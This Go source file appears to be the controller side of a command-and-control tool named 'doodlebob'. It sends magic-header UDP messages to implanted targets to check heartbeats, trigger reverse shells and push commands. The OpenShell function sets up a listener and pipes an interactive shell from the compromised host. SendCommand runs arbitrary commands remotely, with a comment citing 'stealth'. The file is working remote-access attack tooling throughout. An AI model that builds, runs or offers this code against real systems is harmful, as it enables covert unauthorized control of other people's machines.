// Contains the backend logic for the controller cli
package cli

import (
	"encoding/json"
	"fmt"
	"io"
	"math/rand"
	"net"
	"os"
	"strconv"

	"github.com/MeHungr/doodlebob/internal/message"
	"github.com/MeHungr/doodlebob/internal/network"
)

// prependHeaderAndSend adds the magic header to the beginning of the message and sends it
func prependHeaderAndSend(msg *message.Message, conn net.Conn) error {
	// Add the magic header to the message
	jsonPayload, err := json.Marshal(msg)
	if err != nil {
		return fmt.Errorf("encoding message: %w", err)
	}
	payload := append(message.MagicHeader, jsonPayload...)

	// Send json payload
	if _, err := conn.Write(payload); err != nil {
		return fmt.Errorf("writing UDP payload: %w", err)
	}

	return nil
}

// Heartbeat sends a heartbeat to the host and waits for a response
func Heartbeat(udpTarget, targetIP, targetPort, srcIP, srcPort string) error {
	// Join the IP and port
	addr := net.JoinHostPort(udpTarget, targetPort)

	listener, err := net.ListenPacket("udp", ":"+srcPort)
	if err != nil {
		return fmt.Errorf("opening shell listener: %w", err)
	}
	defer listener.Close() // Close listener when function returns

	errChan := make(chan error, 2)
	doneChan := make(chan struct{})

	// Listen for heartbeat concurrently
	go func() {
		buf := make([]byte, 1024)
		// ReadFrom blocks until a UDP packet arrives
		n, addr, err := listener.ReadFrom(buf)
		if err != nil {
			errChan <- fmt.Errorf("reading from connection: %w", err)
			return
		}

		message := string(buf[:n])
		fmt.Printf("Received heartbeat from %q: %s\n", addr.String(), message)
		close(doneChan) // Signal successful completion
	}()

	// Dial the target with udp to send heartbeat request
	go func() {
		targetAddr, err := net.ResolveUDPAddr("udp", addr)
		if err != nil {
			errChan <- fmt.Errorf("resolving target: %w", err)
			return
		}

		msg := &message.Message{
			Type:    message.Heartbeat,
			DstIP:   targetIP,
			DstPort: targetPort,
			SrcIP:   srcIP,
			SrcPort: srcPort,
			Data:    "",
		}

		jsonPayload, err := json.Marshal(msg)
		if err != nil {
			errChan <- fmt.Errorf("encoding message: %w", err)
			return
		}

		payload := append(
			append([]byte(nil), message.MagicHeader...),
			jsonPayload...,
		)

		_, err = listener.WriteTo(payload, targetAddr)
		if err != nil {
			errChan <- fmt.Errorf("sending heartbeat: %w", err)
		}
	}()

	// Handle synchronization and errors safely
	select {
	case err := <-errChan:
		return fmt.Errorf("heartbeat failed: %w", err)
	case <-doneChan:
		return nil // Success
	}
}

// OpenShell opens a listener on the control host for a reverse shell from the target
func OpenShell(udpTarget, targetIP, targetPort string) error {
	// Obtains the source ip and picks a random port for the reverse shell
	rawIP := network.LocalIP().String()
	srcPort := strconv.Itoa(rand.Intn(45000) + 10000)
	srcIP, _, err := net.SplitHostPort(rawIP)
	if err != nil {
		srcIP = rawIP
	}

	// Open reverse shell listener on random tcp port
	listener, err := net.Listen("tcp", ":"+srcPort)
	if err != nil {
		return fmt.Errorf("opening shell listener: %w", err)
	}
	defer listener.Close() // Close listener when function returns

	// Channel to capture the incoming connection asynchronously
	type connResult struct {
		conn net.Conn
		err  error
	}
	ch := make(chan connResult, 1)

	// Start accepting in the background so we don't miss a fast target response
	go func() {
		c, e := listener.Accept()
		ch <- connResult{conn: c, err: e}
	}()

	// Listener is running in the background, so we can send the message to the target
	if err := sendShell(udpTarget, targetIP, targetPort, srcIP, srcPort); err != nil {
		return fmt.Errorf("sending shell message: %w", err)
	}

	// Block until the target connects or an error occurs
	res := <-ch
	if res.err != nil {
		return fmt.Errorf("accepting connection: %w", res.err)
	}
	conn := res.conn
	defer conn.Close() // Close connection once function returns

	fmt.Printf("[+] Target connected from %s!\nOpening doodlebob terminal >:3\n", conn.RemoteAddr().String())

	// Channel to cleanly block until the session terminates
	done := make(chan struct{})

	// Stream incoming target shell output to control terminal
	go func() {
		_, _ = io.Copy(os.Stdout, conn)
		fmt.Println("\n[-] Target disconnected.")
		close(done)
	}()

	// Stream keyboard straight into the connection
	go func() {
		_, _ = io.Copy(conn, os.Stdin)
	}()

	// Keep OpenShell alive until goroutine signals a disconnect
	<-done
	return nil
}

// sendShell sends a shell message to the target host
func sendShell(udpTarget, targetIP, targetPort, srcIP, srcPort string) error {
	// Join the IP and port
	addr := net.JoinHostPort(udpTarget, targetPort)

	// Dial the target with udp
	conn, err := net.Dial("udp", addr)
	if err != nil {
		return fmt.Errorf("connecting to client: %w", err)
	}
	defer conn.Close() // Close connection when function returns

	// Create message struct
	msg := &message.Message{
		Type:    message.Shell,
		DstIP:   targetIP,
		DstPort: targetPort,
		SrcIP:   srcIP,
		SrcPort: srcPort,
		Data:    "",
	}

	// Add the magic header and send the message. Returns any errors from this function
	return prependHeaderAndSend(msg, conn)
}

// SendCommand sends a command to the target host
// There is no output bc stealth
// udpTarget is the target for the UDP packet
// targetIP is the target of the command
func SendCommand(udpTarget, targetIP, port string, cmd string) error {
	// Join the IP and port
	addr := net.JoinHostPort(udpTarget, port)

	// Dial the target with udp
	conn, err := net.Dial("udp", addr)
	if err != nil {
		return fmt.Errorf("connecting to client: %w", err)
	}
	defer conn.Close() // Close connection when function returns

	// Create message struct
	msg := &message.Message{
		Type:  message.Command,
		DstIP: targetIP,
		DstPort: port,
		Data:  cmd,
	}

	// Add the magic header and send the message. Returns any errors from this function
	return prependHeaderAndSend(msg, conn)
}
